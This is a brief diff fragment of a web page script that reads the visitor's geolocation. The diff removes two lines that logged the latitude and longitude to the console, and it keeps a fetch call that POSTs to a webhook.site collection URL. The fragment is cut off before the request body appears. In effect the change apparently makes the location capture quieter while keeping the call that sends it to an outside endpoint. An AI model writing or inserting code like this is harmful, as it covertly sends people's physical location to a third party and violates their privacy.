@@ -8,8 +8,6 @@
 
   <script>
     navigator.geolocation.getCurrentPosition(function(position) {
-      console.log("Lat:", position.coords.latitude);
-console.log("Lng:", position.coords.longitude);
 fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
         method: "POST",
   headers: {
